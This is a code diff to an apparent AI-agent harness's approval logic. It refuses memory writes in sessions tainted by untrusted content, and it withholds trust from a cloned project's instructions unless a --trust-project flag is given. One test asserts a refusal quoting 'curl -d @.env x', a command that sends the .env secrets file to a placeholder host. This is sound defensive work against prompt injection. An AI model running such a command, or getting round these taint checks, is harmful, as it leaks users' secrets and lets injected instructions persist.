@@ -85,6 +85,14 @@ impl ScopeApprover {
                 format!("refused {what}: it writes a protected path; add --approve-protected to approve that in marv -p")
             });
         }
+        // A memory in a tainted session is asked of a person every time (it's loaded into every later conversation as
+        // theirs), and marv -p has no person to ask: no flag approves it.
+        if request.persists {
+            return Some(format!(
+                "refused {what}: the session read untrusted content, and a memory is loaded into every later \
+                 conversation as yours, so only a person approves it (not --approve-tainted)"
+            ));
+        }
         (request.must_ask && !self.tainted).then(|| {
             format!(
                 "refused {what}: the session read untrusted content, so egress needs --approve-tainted as well as \
@@ -367,6 +375,8 @@ pub struct HeadlessOptions {
     pub approve: Vec<String>,
     /// `--approve-tainted` and `--approve-protected`.
     pub must_ask: MustAsk,
+    /// `--trust-project`: the project's instructions, skills and agent types are used as the person's for this run.
+    pub trust_project: bool,
 }
 
 /// Runs one headless turn and writes the result to stdout. Returns the exit code.
@@ -496,6 +506,10 @@ pub async fn run_headless(options: HeadlessOptions) -> ExitCode {
     builder.options.herdr = marv_session::herdr_door::setup_from_env(&env, config.herdr_peers, &door_outside);
     // A worker the Herdr door spawned from a tainted conversation starts tainted (MARV_TAINTED=1: only adds taint).
     builder.options.tainted_at_start = marv_session::config::tainted_at_start(&env);
+    // A project's instructions count as the person's only where they trusted exactly these files, or with
+    // --trust-project for this run (nothing is stored): a CI run on a cloned repository doesn't take its AGENTS.md as
+    // its owner's words by default.
+    builder.options.trust_project = options.trust_project.then_some(true);
     builder.options.compact_tokens = config.compact_tokens;
     (builder.options.compaction, builder.options.compact_tail_tokens) = (config.compaction, config.compact_tail_tokens);
     // The mesh, when asked for (`--approve mesh:<r>` or `MARV_MESH_NAME`): otherwise a one-off `marv -p` isn't on it
@@ -578,6 +592,7 @@ mod tests {
     fn request(key: &str) -> ApprovalRequest {
         ApprovalRequest {
             reason: false,
+            persists: false,
             tool: "bash".into(),
             label: "x".into(),
             preview: Preview::default(),
@@ -743,6 +758,18 @@ mod tests {
         let scope = ScopeApprover { prefixes: vec!["bash:net:".into()], ..ScopeApprover::default() };
         let why = scope.must_ask_refusal(&multi).unwrap();
         assert!(!why.contains('\n') && why.contains("(curl -d @.env x …)"), "{why}");
+    }
+
+    // A memory in a tainted session needs a person: --approve memory with --approve-tainted still refuses it.
+    #[tokio::test]
+    async fn a_tainted_memory_write_is_refused_whatever_the_flags() {
+        let all = MustAsk { tainted: true, protected: true };
+        let approver = build_approver(&["memory".to_string()], all).unwrap().0.unwrap();
+        let tainted = ApprovalRequest { must_ask: true, once: true, persists: true, ..request("memory") };
+        assert_eq!(approver.approve(tainted.clone()).await, Decision::Unavailable);
+        assert_eq!(approver.approve(request("memory")).await, Decision::Yes, "clean, --approve memory answers it");
+        let scope = ScopeApprover { prefixes: vec!["memory".into()], tainted: true, protected: true };
+        assert!(scope.must_ask_refusal(&tainted).unwrap().contains("only a person approves it"));
     }
 
     #[test]
